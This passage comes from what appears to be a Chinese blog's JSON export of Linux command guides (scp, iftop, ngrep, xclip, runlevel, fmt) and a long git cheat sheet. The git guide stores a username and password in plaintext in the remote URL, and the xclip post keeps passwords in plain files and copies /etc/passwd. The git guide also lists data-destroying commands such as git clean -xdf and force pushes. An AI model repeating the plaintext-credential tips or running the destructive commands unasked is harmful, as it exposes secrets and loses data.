目录到本地的/opt/soft/目录来。 上传本地文件到远程机器指定目录 scp /opt/soft/nginx-0.5.38.tar.gz root@10.10.10.10:/opt/soft/scptest # 指定端口 2222 scp -rp -P 2222 /opt/soft/nginx-0.5.38.tar.gz root@10.10.10.10:/opt/soft/scptest 复制本地/opt/soft/目录下的文件 nginx-0.5.38.tar.gz 到远程机器 10.10.10.10 的opt/soft/scptest目录。 上传本地目录到远程机器指定目录 scp -r /opt/soft/mongodb root@10.10.10.10:/opt/soft/scptest 上传本地目录/opt/soft/mongodb到远程机器 10.10.10.10 上/opt/soft/scptest的目录中去。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"scp","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/scp/","stats":{"text":"4 min read","time":188000,"words":758,"minutes":4},"date":"2022-02-01 12:47:49","dateFormat":"2022-02-01"},{"content":"一款实时流量监控工具。 补充说明 iftop 命令是一款实时流量监控工具，监控 TCP/IP 连接等，缺点就是无报表功能。必须以 root 身份才能运行。 语法 iftop (选项) 选项 iftop: display bandwidth usage on an interface by host Synopsis: iftop -h | [-npblNBP] [-i interface] [-f filter code] [-F net/mask] [-G net6/mask6] -h display this message -n don't do hostname lookups -N don't convert port numbers to services -p run in promiscuous mode (show traffic between other hosts on the same network segment) -b don't display a bar graph of traffic -B Display bandwidth in bytes -i interface listen on named interface -f filter code use filter code to select packets to count (default: none, but only IP packets are counted) -F net/mask show traffic flows in/out of IPv4 network -G net6/mask6 show traffic flows in/out of IPv6 network -l display and count link-local IPv6 traffic (default: off) -P show ports as well as hosts -m limit sets the upper limit for the bandwidth scale -c config file specifies an alternative configuration file -t use text interface without ncurses Sorting orders: -o 2s Sort by first column (2s traffic average) -o 10s Sort by second column (10s traffic average) [default] -o 40s Sort by third column (40s traffic average) -o source Sort by source address -o destination Sort by destination address The following options are only available in combination with -t -s num print one single text output afer num seconds, then quit -L num number of lines to print 界面说明 第一行为带宽，这里为 1Mbit,不是字节哦. 连接列表，最后三列分别是 2 秒，10 秒和 40 秒的平均流量=&gt;代表发送 &lt;=代表接收最后三行表示发送，接收和全部的流量， 第二列为你运行 iftop 到目前流量，第三列为高峰值，第四列为平均值。 实例 iftop # 默认是监控第一块网卡的流量 iftop -i eth1 # 监控eth1 iftop -n # 直接显示IP, 不进行DNS反解析 iftop -N # 直接显示连接埠编号, 不显示服务名称 iftop -F 192.168.1.0/24 or 192.168.1.0/255.255.255.0 # 显示某个网段进出封包流量 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"iftop","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/iftop/","stats":{"text":"3 min read","time":140000,"words":468,"minutes":3},"date":"2022-02-01 12:46:15","dateFormat":"2022-02-01"},{"content":"方便的数据包匹配和显示工具。 补充说明 ngrep 命令是 grep 命令的网络版，他力求更多的 grep 特征，用于搜寻指定的数据包。正由于安装 ngrep 需用到 libpcap 库， 所以支持大量的操作系统和网络协议。能识别 TCP、UDP 和 ICMP 包，理解 bpf 的过滤机制。 安装 ngrep 命令的下载地址：http://ngrep.sourceforge.net/，libpcap 下载地址：http://www.tcpdump.org/。先用yum install libpcap完全安装 libpcap，注意有时候用 libpcap 安装包安装的不完整会影响 ngrep 的使用。 如果 yum 无法安装就用以下步骤安装 libpcap： wget http://www.tcpdump.org/release/libpcap-1.3.0.tar.gz tar -zxf libpcap-1.3.0.tar.gz cd libpcap-1.3.0 ./configure make &amp;&amp; make install ngrep 的安装就是 configure/make/make install 三部曲。 注：configure 时是遇到 please wipe out all unused pcap installations，添加以下选项： ./configure --with-pcap-includes=/usr/local/include/pcap 在安装后输入 ngrep 来验证下安装是否成功。 语法 ngrep &lt;-LhNXViwqpevxlDtTRM&gt; &lt;-IO pcap_dump&gt; &lt;-n num&gt; &lt;-d dev&gt; &lt;-A num&gt; &lt;-s snaplen&gt; &lt;-S limitlen&gt; &lt;-w normal|byline|single|none&gt; &lt;-c cols&gt; &lt;-P char&gt; &lt;-F file&gt; &lt;match expression&gt; &lt;bpf filter&gt; 选项 -e # 显示空数据包 -i # 忽略大小写 -v # 反转匹配 -R # don't do privilege revocation logic -x # 以16进制格式显示 -X # 以16进制格式匹配 -w # 整字匹配 -p # 不使用混杂模式 -l # make stdout line buffered -D # replay pcap_dumps with their recorded time intervals -t # 在每个匹配的包之前显示时间戳 -T # 显示上一个匹配的数据包之间的时间间隔 -M # 仅进行单行匹配 -I # 从文件中读取数据进行匹配 -O # 将匹配的数据保存到文件 -n # 仅捕获指定数目的数据包进行查看 -A # 匹配到数据包后dump随后的指定数目的数据包 -s # set the bpf caplen -S # set the limitlen on matched packets -W # 设置显示格式byline将解析包中的换行符 -c # 强制显示列的宽度 -P # set the non-printable display char to what is specified -F # 使用文件中定义的bpf(Berkeley Packet Filter) -N # 显示由IANA定义的子协议号 -d # 使用哪个网卡，可以用-L选项查询 -L # 查询网卡接口 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ngrep","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ngrep/","stats":{"text":"3 min read","time":151000,"words":577,"minutes":3},"date":"2022-02-01 12:45:21","dateFormat":"2022-02-01"},{"content":"管理 X 粘贴板。 补充说明 在 X 系统里面，从一个窗口复制一段文字到另一个窗口，有两套机制，分别是 Selections 和 cut buffers。 常用的 copy &amp; paste 是利用的 cut buffers 机制;另外用鼠标选中一段文字，然后在另一个窗口按鼠标中键实现复制，利用的是 selections 机制。selection 又可以分为 master 和 slave selection。 当用鼠标选中一段文件，这段文字就自动被复制到 master selection。然后在另一个地方按鼠标中键，就自动把 master selection 的内容粘贴出来。 当你想复制少量文字的时候，两种方法都是很方便的。但是当复制大段文字的时候就挺麻烦。另外就是你可能会频繁的执行一些复制粘贴工作，不停的用鼠标选中文字，然后再粘贴。这是对手指的折磨。 我忍受不了这种折磨，所以发现了 xclip， 方便的管理 X selections 里面内容的工具。 比如如下命令就把文件 /etc/passwd 的内容复制到 X master selections 里面了。 xclip -i /etc/passwd 然后到别的地方就能复制出来，利用鼠标中键。或者是更舒服的 shift+insert。 我现在最常用的方法是通过键盘绑定来管理 X master selections 的内容。比如 alt+F1 就能把我的 ~/f1 的内容复制到 X master selections，alt + F2 复制 ~/f2 的内容。这样就能把你需要经常用到的内容方便的进行复制粘贴。比如常用的密码啥的。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"xclip","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/xclip/","stats":{"text":"2 min read","time":88000,"words":405,"minutes":2},"date":"2022-02-01 10:19:09","dateFormat":"2022-02-01"},{"content":"打印当前 Linux 系统的运行等级。 补充说明 runlevel 命令用于打印当前 Linux 系统的运行等级。 语法 runlevel 知识扩展 linux 操作系统自从开始启动至启动完毕需要经历几个不同的阶段，这几个阶段就叫做 runlevel，同样，当 linux 操作系统关闭时也要经历另外几个不同的 runlevel，下面我们就准备详细介绍一下 runlevel，并向您展示一些小技巧来让您的 linux 系统避免不必要的重启动。 runlevel 可以认为是系统状态，形象一点，您可以认为 runlevel 有点象微软的 windows 操作系统中的 Normal，safemode，和 command prompt only。进入每个 runlevel 都需要启动或关闭相应的一系列服务 (services)，这些服务 (services) 以初始化脚本的方式放置于目录/etc/rc.d/rc?.d/或者/etc/rc?.d下面（?代表 runlevel 的对应序号）。 在大多数的 linux 发行版本中，通常有 8 个 runlevel： 0 停机 1 单用户模式 2 多用户，没有 NFS 3 完全多用户模式 4 没有用到 5 图形界面 6 重新启动 S s Single user mode 多数的桌面的 linux 系统缺省的 runlevel 是 5，用户登陆时是图形界面，而多数的服务器版本的 linux 系统缺省的 runlevel 是 3，用户登陆时是字符界面，runlevel 1 和 2 除了调试之外很少使用，runlevel s 和 S 并不是直接给用户使用，而是用来为 Single user mode 作准备。 linux 的运行模式比起 windows 的启动模式的优势在于：你可以在系统空闲时使用 init 命令切换你现在使用的 runlevel，另外，当你关闭或者启动 linux 系统时你已经不知不觉中切换你的 runlevel，系统关机进程需要调用 runlevel(0 或 6) 来关闭所有正在运行中的进程。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"runlevel","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/runlevel/","stats":{"text":"2 min read","time":110000,"words":489,"minutes":2},"date":"2022-02-01 10:01:33","dateFormat":"2022-02-01"},{"content":"读取文件后优化处理并输出。 补充说明 fmt 命令读取文件的内容，根据选项的设置对文件格式进行简单的优化处理，并将结果送到标准输出设备。 语法 fmt (选项) (参数) 选项 -c 或--crown-margin：每段前两列缩排； -p&lt;列起始字符串&gt;或-prefix=&lt;列起始字符串&gt;：仅合并含有指定字符串的列，通常运用在程序语言的注解方面； -s 或--split-only：只拆开字数超出每列字符数的列，但不合并字数不足每列字符数的列； -t 或--tagged-paragraph：每列前两列缩排，但第 1 列和第 2 列的缩排格式不同； -u 或--uniform-spacing：每列字符之间都以一个空格字符间隔，每个句子之间则两个空格字符分隔； -w&lt;每列字符数&gt;或--width=&lt;每列字符数&gt;或-&lt;每列字符数&gt;：设置每列的最大字符数。 参数 指定要优化格式的文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"fmt","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/fmt/","stats":{"text":"1 min read","time":58000,"words":265,"minutes":1},"date":"2022-02-01 09:53:29","dateFormat":"2022-02-01"},{"content":"是目前世界上最先进的分布式版本控制系统。 语法 git [--version] [--help] [-C &lt;path&gt;] [-c name=value] [--exec-path[=&lt;path&gt;]] [--html-path] [--man-path] [--info-path] [-p | --paginate | --no-pager] [--no-replace-objects] [--bare] [--git-dir=&lt;path&gt;] [--work-tree=&lt;path&gt;] [--namespace=&lt;name&gt;] &lt;command&gt; [&lt;args&gt;] 选项 add 将文件内容添加到索引 bisect 通过二进制查找引入错误的更改 branch 列出，创建或删除分支 checkout 检查分支或路径到工作树 clone 将存储库克隆到新目录中 commit 将更改记录到存储库 diff 显示提交，提交和工作树等之间的更改 fetch 从另一个存储库下载对象和引用 grep 打印匹配图案的行 init 创建一个空的Git仓库或重新初始化一个现有的 log 显示提交日志 merge 加入两个或更多的开发历史 mv 移动或重命名文件，目录或符号链接 pull 从另一个存储库或本地分支获取并合并 push 更新远程引用以及相关对象 rebase 转发端口本地提交到更新的上游头 reset 将当前HEAD复位到指定状态 rm 从工作树和索引中删除文件 show 显示各种类型的对象 status 显示工作树状态 tag 创建，列出，删除或验证使用GPG签名的标签对象 例子 init git init#初始化 status git status#获取状态 add git add file# . 或 * 代表全部添加 git rm --cached &lt;added_file_to_undo&gt; # 在 commit 之前撤销 git add 操作 git reset head # 好像比上面git rm --cached更方便 commit git commit -m &quot;message&quot; #此处注意乱码 remote git remote add origin git@github.com:xxxxxx/test.git #添加源 push git push -u origin master # push同事设置默认跟踪分支 git push origin master git push -f origin master # 强制推送文件，缩写 -f（全写--force） clone `git clone git://github.com/xxxxxx/xxxxxx.js.git` `git clone git://github.com/xxxxxx/xxxxxx.js.git mypro` #克隆到自定义文件夹 `git clone [user@]example.com:path/to/repo.git/` #SSH 协议还有另一种写法。 git clone 支持多种协议，除了 HTTP (s) 以外，还支持 SSH、Git、本地文件协议等，下面是一些例子。`git clone &lt;版本库的网址&gt; &lt;本地目录名&gt;` ```Shell $ git clone http[s]://example.com/path/to/repo.git/ $ git clone ssh://example.com/path/to/repo.git/ $ git clone git://example.com/path/to/repo.git/ $ git clone /opt/git/project.git $ git clone file:///opt/git/project.git $ git clone ftp[s]://example.com/path/to/repo.git/ $ git clone rsync://example.com/path/to/repo.git/ 配置 首先是配置帐号信息ssh -T git@github.com测试。 修改项目中的个人信息 git help config # 获取帮助信息，查看修改个人信息的参数 git config --global user.name &quot;user&quot; # 修改全局名字 git config --global user.email &quot;example@example.com&quot; # 修改全局邮箱 git config --list # 查看配置的信息 配置自动换行 自动转换坑太大，提交到 git 是自动将换行符转换为 lf git config --global core.autocrlf input 常见使用场景 创建SSH密钥 这个密钥用来跟 github 通信，在本地终端里生成然后上传到 github ssh-keygen -t rsa -C 'example@example.com' # 生成密钥 ssh-keygen -t rsa -C &quot;example@example.com&quot; -f ~/.ssh/ww_rsa # 指定生成目录文件名字 ssh -T git@github.com # 测试是否成功 多账号 ssh 配置 生成指定名字的密钥 ssh-keygen -t rsa -C &quot;邮箱地址&quot; -f ~/.ssh/example@example.com_rsa会生成example@example.com_rsa和example@example.com_rsa.pub这两个文件 密钥复制到托管平台上 vim ~/.ssh/example@example.com_rsa.pub 打开公钥文件example@example.com_rsa.pub，并把内容复制至代码托管平台上 修改 config 文件 vim ~/.ssh/config#修改 config 文件，如果没有创建config Host example@example.com.github.com HostName github.com User git IdentityFile ~/.ssh/example@example.com_rsa Host work.github.com HostName github.com # Port 服务器open-ssh端口（默认：22,默认时一般不写此行） # PreferredAuthentications 配置登录时用什么权限认证 # publickey|password publickey|keyboard-interactive等 User git IdentityFile ~/.ssh/work_rsa Host这里是个别名可以随便命名 HostName一般是网站如：git@ss.github.com:username/repo.git填写github.com User通常填写git IdentityFile使用的公钥文件地址 测试 ssh -T git@example@example.com.github.com # `@`后面跟上定义的Host ssh -T work.github.com # 通过别名测试 ssh -i ~/公钥文件地址 Host别名 # 如 ssh -i ~/.ssh/work_rsa work.github.com 使用 # 原来的写法 git clone git@github.com:&lt;example@example.com的用户名&gt;/learngit.git # 现在的写法 git clone git@example@example.com.github.com:&lt;example@example.com的用户名&gt;/learngit.git git clone git@work.github.com:&lt;work的用户名&gt;/learngit.git 注意 如果你修改了 id_rsa 的名字，你需要将 ssh key 添加到 SSH agent 中，如： ssh-add ~/.ssh/example@example.com_rsa ssh-add -l # 查看所有的key ssh-add -D # 删除所有的key ssh-add -d ~/.ssh/example@example.com_rsa # 删除指定的key 免密码登录远程服务器 $ ssh-keygen -t rsa -P '' -f ~/.ssh/xxxxx.key $ ssh-copy-id -i ~/.ssh/xxxxx.key.pub root@192.168.182.112 # 这里需要输入密码一次 编辑~/.ssh/config Host aliyun1 HostName 192.168.182.112 User root PreferredAuthentications publickey IdentityFile ~/.ssh/xxxxx.key 上面配置完了，可以通过命令登录，不需要输入 IP 地址和密码ssh aliyun1 https 协议下提交代码免密码 git clone https://github.com/username/rep.git 通过上面方式克隆可能需要密码，解决办法：进入当前克隆的项目vi rep/.git/config编辑`config, 按照下面方式修改，你就可以提交代码不用输入密码了。 [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true ignorecase = true precomposeunicode = true [remote &quot;origin&quot;] - url = https://github.com/username/rep.git + url = https://用户名:密码@github.com/username/rep.git fetch = +refs/heads/*:refs/remotes/origin/* [branch &quot;master&quot;] remote = origin merge = refs/heads/master 文件推向 3 个 git 库 增加 3 个远程库地址 git remote add origin https://github.com/xxxxxx/xxxxxx.git git remote set-url --add origin http://example.com/xxx/xxxxxx.js.git git remote set-url --add origin http://example.com/xxx/xxxxxx.js.git 删除其中一个 set-url 地址 usage: git remote set-url [--push] &lt;name&gt; &lt;newurl&gt; [&lt;oldurl&gt;] or: git remote set-url --add &lt;name&gt; &lt;newurl&gt; or: git remote set-url --delete &lt;name&gt; &lt;url&gt; git remote set-url --delete origin http://example.com/xxx/xxxxxx.js.git 3. 推送代码 git push origin master git push -f origin master # 强制推送 拉代码 只能拉取origin里的一个 url 地址，这个 fetch-url 默认为你添加的到origin的第一个地址 git pull origin master git pull --all # 获取远程所有内容包括tag git pull origin next:master # 取回origin主机的next分支，与本地的master分支合并 git pull origin next # 远程分支是与当前分支合并 # 上面一条命令等同于下面两条命令 git fetch origin git merge origin/next 如果远程主机删除了某个分支，默认情况下，git pull 不会在拉取远程分支的时候，删除对应的本地分支。这是为了防止，由于其他人操作了远程主机，导致 git pull 不知不觉删除了本地分支。 但是，你可以改变这个行为，加上参数 -p 就会在本地删除远程已经删除的分支。 $ git pull -p # 等同于下面的命令 $ git fetch --prune origin $ git fetch -p 更改 pull 只需要更改 config 文件里，那三个 url 的顺序即可，fetch-url 会直接对应排行第一的那个 url 连接。 修改远程仓库地址 git remote remove origin # 删除该远程路径 git remote add origin git@example@example.com.github.com:xxxxxx/xxxxxx.git # 添加远程路径 撤销远程记录 git reset --hard HEAD~1 # 撤销一条记录 git push -f origin HEAD:master # 同步到远程仓库 放弃本地的文件修改 git reset --hard FETCH_HEAD # FETCH_HEAD表示上一次成功git pull之后形成的commit点。然后git pull git reset --hard FETCH_HEAD出现错误 git pull You are not currently on a branch, so I cannot use any 'branch.&lt;branchname&gt;.merge' in your configuration file. Please specify which remote branch you want to use on the command line and try again (e.g. 'git pull &lt;repository&gt; &lt;refspec&gt;'). See git-pull(1) FOR details. 解决方法： git checkout -b temp # 新建+切换到temp分支 git checkout master 最简单放弃本地修改内容 # 如果有的修改以及加入暂存区的话 git reset --hard # 还原所有修改，不会删除新增的文件 git checkout . # 下面命令会删除新增的文件 git clean -xdf 通过存储暂存区 stash，在删除暂存区的方法放弃本地修改。 git stash &amp;&amp; git stash drop 回滚到某个 commit 提交 git revert HEAD~1 # 撤销一条记录 会弹出 commit 编辑 git push # 提交回滚 回退到某一个版本 git reset --hard &lt;hash&gt; # 例如 git reset --hard a3hd73r # --hard代表丢弃工作区的修改，让工作区与版本代码一模一样，与之对应， # --soft参数代表保留工作区的修改。 去掉某个 commit # 实质是新建了一个与原来完全相反的commit，抵消了原来commit的效果 git revert &lt;commit-hash&gt; 新建一个空分支 # 这种方式新建的分支(gh-pages)是没有 commit 记录的 git checkout --orphan gh-pages # 删除新建的gh-pages分支原本的内容，如果不删除，提交将作为当前分支的第一个commit git rm -rf . # 查看一下状态 有可能上面一条命令，没有删除还没有提交的的文件 git state 合并多个 commit # 这个命令，将最近4个commit合并为1个，HEAD代表当前版本。 # 将进入VIM界面，你可以修改提交信息。 git rebase -i HEAD~4 # 可以看到其中分为两个部分，上方未注释的部分是填写要执行的指令， # 而下方注释的部分则是指令的提示说明。指令部分中由前方的命令名称、commit hash 和 commit message 组成 # 当前我们只要知道 pick 和 squash 这两个命令即可。 # --&gt; pick 的意思是要会执行这个 commit # --&gt; squash 的意思是这个 commit 会被合并到前一个commit # 我们将 需要保留的 这个 commit 前方的命令改成 squash 或 s，然后输入:wq以保存并退出 # 这是我们会看到 commit message 的编辑界面 # 其中, 非注释部分就是两次的 commit message, 你要做的就是将这两个修改成新的 commit message。 # # 输入wq保存并推出, 再次输入git log查看 commit 历史信息，你会发现这两个 commit 已经合并了。 # 将修改强制推送到前端 git push -f origin master 修改远程Commit记录 git commit --amend # amend只能修改没有提交到线上的，最后一次commit记录 git rebase -i HEAD~3 # 表示要修改当前版本的倒数第三次状态 # 将要更改的记录行首单词 pick 改为 edit pick 96dc3f9 doc: Update quick-start.md pick f1cce8a test(Transition):Add transition test (#47) pick 6293516 feat(Divider): Add Divider component. # Rebase eeb03a4..6293516 onto eeb03a4 (3 commands) # # Commands: # p, pick = use commit # r, reword = use commit, but edit the commit message # e, edit = use commit, but stop for amending # s, squash = use commit, but meld into previous commit # f, fixup = like &quot;squash&quot;, but discard this commit's log message # x, exec = run command (the rest of the line) using shell # d, drop = remove commit 保存并退出，会弹出下面提示 # You can amend the commit now, with # # git commit --amend # # Once you are satisfied with your changes, run # # git rebase --continue # 通过这条命令进入编辑页面更改commit，保存退出 git commit --amend # 保存退出确认修改，继续执行 rebase, git rebase --continue # 如果修改多条记录反复执行上面两条命令直到完成所有修改 # 最后，确保别人没有提交进行push，最好不要加 -f 强制推送 git push -f origin master 添加忽略文件 echo node_modules/ &gt;&gt; .gitignore 利用 commit 关闭一个 issue 这个功能在 Github 上可以玩儿，Gitlab 上特别老的版本不能玩儿哦，那么如何跟随着 commit 关闭一个 issue 呢？在 confirm merge 的时候可以使用一下命令来关闭相关 issue: fixes #xxx、fixed #xxx、fix #xxx、closes #xxx、close #xxx、closed #xxx 同步 fork 的上游仓库 设置添加多个远程仓库地址 在同步之前，需要创建一个远程点指向上游仓库 (repo). 如果你已经派生了一个原始仓库，可以按照如下方法做。 $ git remote -v # List the current remotes （列出当前远程仓库） # origin https://github.com/user/repo.git (fetch) # origin https://github.com/user/repo.git (push) $ git remote add upstream https://github.com/otheruser/repo.git # Set a new remote (设置一个新的远程仓库) $ git remote -v # Verify new remote (验证新的原唱仓库) # origin https://github.com/user/repo.git (fetch) # origin https://github.com/user/repo.git (push) # upstream https://github.com/otheruser/repo.git (fetch) # upstream https://github.com/otheruser/repo.git (push) 同步更新仓库内容 同步上游仓库到你的仓库需要执行两步：首先你需要从远程拉去，之后你需要合并你希望的分支到你的本地副本分支。从上游的存储库中提取分支以及各自的提交内容。 master将被存储在本地分支机构upstream/master git fetch upstream # remote: Counting objects: 75, done. # remote: Compressing objects: 100% (53/53), done. # remote: Total 62 (delta 27), reused 44 (delta 9) # Unpacking objects: 100% (62/62), done. # From https://github.com/ORIGINAL_OWNER/ORIGINAL_REPOSITORY # * [new branch] master -&gt; upstream/master 检查你的 fork's 本地master分支 git checkout master # Switched to branch 'master' 合并来自upstream/master的更改到本地 master 分支上。 这使你的前 fork'smaster分支与上游资源库同步，而不会丢失你本地修改。 git merge upstream/master # Updating a422352..5fdff0f # Fast-forward # README | 9 ------- # README.md | 7 ++++++ # 2 files changed, 7 insertions(+), 9 deletions(-) # delete mode 100644 README # create mode 100644 README.md 批量修改历史 commit 中的名字和邮箱 克隆仓库 注意参数，这个不是普通的 clone，clone 下来的仓库并不能参与开发 git clone --bare https://github.com/user/repo.git cd repo.git 命令行中运行代码 OLD_EMAIL 原来的邮箱 CORRECT_NAME 更正的名字 CORRECT_EMAIL 更正的邮箱 将下面代码复制放到命令行中执行 git filter-branch -f --env-filter ' OLD_EMAIL=&quot;example@example.com&quot; CORRECT_NAME=&quot;user&quot; CORRECT_EMAIL=&quot;更正的邮箱@example.com&quot; if [ &quot;$GIT_COMMITTER_EMAIL&quot; = &quot;$OLD_EMAIL&quot; ] then export GIT_COMMITTER_NAME=&quot;$CORRECT_NAME&quot; export GIT_COMMITTER_EMAIL=&quot;$CORRECT_EMAIL&quot; fi if [ &quot;$GIT_AUTHOR_EMAIL&quot; = &quot;$OLD_EMAIL&quot; ] then export GIT_AUTHOR_NAME=&quot;$CORRECT_NAME&quot; export GIT_AUTHOR_EMAIL=&quot;$CORRECT_EMAIL&quot; fi ' --tag-name-filter cat -- --branches --tags 执行过程 Rewrite 160d4df2689ff6df3820563bfd13b5f1fb9ba832 (479/508) (16 seconds passed, remaining 0 predicted) Ref 'refs/heads/dev' was rewritten Ref 'refs/heads/master' was rewritten 同步到远程仓库 同步到push远程git仓库 git push --force --tags origin 'refs/heads/*' 我还遇到了如下面错误，lab 默认给 master 分支加了保护，不允许强制覆盖。Project (项目)-&gt;Setting-&gt;Repository菜单下面的Protected branches把 master 的保护去掉就可以了。修改完之后，建议把 master 的保护再加回来，毕竟强推不是件好事。 remote: GitLab: You are not allowed to force push code to a protected branch on this project. 当上面的 push 不上去的时候，先git pull确保最新代码 git pull --allow-unrelated-histories # 或者指定分枝 git pull origin master --allow-unrelated-histories 查看某个文件历史 git log --pretty=oneline 文件名 # 列出文件的所有改动历史 git show c178bf49 # 某次的改动的修改记录 git log -p c178bf49 # 某次的改动的修改记录 git blame 文件名 # 显示文件的每一行是在那个版本最后修改。 git whatchanged 文件名 # 显示某个文件的每个版本提交信息：提交日期，提交人员，版本号，提交备注（没有修改细节） 打造自己的 git 命令 git config --global alias.st status git config --global alias.br branch git config --global alias.co checkout git config --global alias.ci commit 配置好后再输入 git 命令的时候就不用再输入一大段了，例如我们要查看状态，只需： git st 中文乱码的解决方案 git config --global core.quotepath false 新建仓库 init git init #初始化 status git status #获取状态 add git add file # .或*代表全部添加 git rm --cached &lt;added_file_to_undo&gt; # 在commit之前撤销git add操作 git reset head # 好像比上面git rm --cached更方便 commit git commit -m &quot;message&quot; #此处注意乱码 remote git remote add origin git@github.com:xxxxxx/test.git #添加源 push git push -u origin master # push同事设置默认跟踪分支 git push origin master git push -f origin master # 强制推送文件，缩写 -f（全写--force） clone git clone git://github.com/xxxxxx/xxxxxx.js.git git clone git://github.com/xxxxxx/xxxxxx.js.git mypro #克隆到自定义文件夹 git clone [user@]example.com:path/to/repo.git/ #SSH协议还有另一种写法。 git clone 支持多种协议，除了 HTTP (s) 以外，还支持 SSH、Git、本地文件协议等，下面是一些例子。git clone &lt;版本库的网址&gt; &lt;本地目录名&gt; $ git clone http[s]://example.com/path/to/repo.git/ $ git clone ssh://example.com/path/to/repo.git/ $ git clone git://example.com/path/to/repo.git/ $ git clone /opt/git/project.git $ git clone file:///opt/git/project.git $ git clone ftp[s]://example.com/path/to/repo.git/ $ git clone rsync://example.com/path/to/repo.git/ 本地 help git help config # 获取帮助信息 add git add * # 跟踪新文件 git add -u [path] # 添加[指定路径下]已跟踪文件 rm rm *&amp;git rm * # 移除文件 git rm -f * # 移除文件 git rm --cached * # 取消跟踪 git mv file_from file_to # 重命名跟踪文件 git log # 查看提交记录 commit git commit #提交更新 git commit -m 'message' #提交说明 git commit -a #跳过使用暂存区域，把所有已经跟踪过的文件暂存起来一并提交 git commit --amend #修改最后一次提交 git commit log #查看所有提交，包括没有push的commit git commit -m &quot;#133&quot; #关联issue 任意位置带上# 符号加上issue号码 git commit -m &quot;fix #133&quot; commit关闭issue git commit -m '概要描述'$'\\n\\n''1.详细描述'$'\\n''2.详细描述' #提交简要描述和详细描述 reset git reset HEAD * # 取消已经暂存的文件 git reset --mixed HEAD * # 同上 git reset --soft HEAD * # 重置到指定状态，不会修改索引区和工作树 git reset --hard HEAD * # 重置到指定状态，会修改索引区和工作树 git reset -- files * # 重置index区文件 revert git revert HEAD # 撤销前一次操作 git revert HEAD~ # 撤销前前一次操作 git revert commit # 撤销指定操作 checkout git checkout -- file # 取消对文件的修改（从暂存区——覆盖worktree file） git checkout branch|tag|commit -- file_name # 从仓库取出file覆盖当前分支 git checkout HEAD~1 [文件] # 将会更新 working directory 去匹配某次 commit git checkout -- . # 从暂存区取出文件覆盖工作区 git checkout -b gh-pages 0c304c9 # 这个表示 从当前分支 commit 哈希值为 0c304c9 的节点，分一个新的分支gh-pages出来，并切换到 gh-pages diff git diff file # 查看指定文件的差异 git diff --stat # 查看简单的diff结果 git diff # 比较Worktree和Index之间的差异 git diff --cached # 比较Index和HEAD之间的差异 git diff HEAD # 比较Worktree和HEAD之间的差异 git diff branch # 比较Worktree和branch之间的差异 git diff branch1 branch2 # 比较两次分支之间的差异 git diff commit commit # 比较两次提交之间的差异 git diff master..test # 上面这条命令只显示两个分支间的差异 git diff master...test # 你想找出‘master’,‘test’的共有 父分支和'test'分支之间的差异，你用3个‘.'来取代前面的两个'.' stash git stash # 将工作区现场（已跟踪文件）储藏起来，等以后恢复后继续工作。 git stash list # 查看保存的工作现场 git stash apply # 恢复工作现场 git stash drop # 删除stash内容 git stash pop # 恢复的同时直接删除stash内容 git stash apply stash@{0} # 恢复指定的工作现场，当你保存了不只一份工作现场时。 merge git merge --squash test # 合并压缩，将test上的commit压缩为一条 cherry-pick git cherry-pick commit # 拣选合并，将commit合并到当前分支 git cherry-pick -n commit # 拣选多个提交，合并完后可以继续拣选下一个提交 rebase git rebase master # 将master分之上超前的提交，变基到当前分支 git rebase --onto master 169a6 # 限制回滚范围，rebase当前分支从169a6以后的提交 git rebase --interactive # 交互模式，修改commit git rebase --continue # 处理完冲突继续合并 git rebase --skip # 跳过 git rebase --abort # 取消合并 分支 branch 删除 git push origin :branchName # 删除远程分支 git push origin --delete new # 删除远程分支new git branch -d branchName # 删除本地分支，强制删除用-D git branch -d test # 删除本地test分支 git branch -D test # 强制删除本地test分支 git remote prune origin # 远程删除了，本地还能看到远程存在，这条命令删除远程不存在的分支 提交 git push -u origin branchName # 提交分支到远程origin主机中 拉取 git fetch -p #拉取远程分支时，自动清理 远程分支已删除，本地还存在的对应同名分支。 分支合并 git merge branchName # 合并分支 - 将分支branchName和当前所在分支合并 git merge origin/master # 在本地分支上合并远程分支。 git rebase origin/master # 在本地分支上合并远程分支。 git merge test # 将test分支合并到当前分支 重命名 git branch -m old new #重命名分支 查看 git branch # 列出本地分支 git branch -r # 列出远端分支 git branch -a # 列出所有分支 git branch -v # 查看各个分支最后一个提交对象的信息 git branch --merge # 查看已经合并到当前分支的分支 git branch --no-merge # 查看为合并到当前分支的分支 git remote show origin # 可以查看remote地址，远程分支 新建 git branch test # 新建test分支 git branch newBrach 3defc69 # 指定哈希3defc69，新建分支名字为newBrach git checkout -b newBrach origin/master # 取回远程主机的更新以后，在它的基础上创建一个新的分支 git checkout -b newBrach 3defc69 # 以哈希值3defc69，新建 newBrach 分支，并切换到该分支 连接 git branch --set-upstream dev origin/dev # 将本地dev分支与远程dev分支之间建立链接 git branch --set-upstream master origin/next # 手动建立追踪关系 分支切换 git checkout test # 切换到test分支 git checkout -b test # 新建+切换到test分支 git checkout -b test dev # 基于dev新建test分支，并切换 远端 git fetch &lt;远程主机名&gt; &lt;分支名&gt; # fetch取回所有分支（branch）的更新 git fetch origin remotebranch[:localbranch] # 从远端拉去分支[到本地指定分支] git merge origin/branch # 合并远端上指定分支 git pull origin remotebranch:localbranch # 拉去远端分支到本地分支 git push origin branch # 将当前分支，推送到远端上指定分支 git push origin 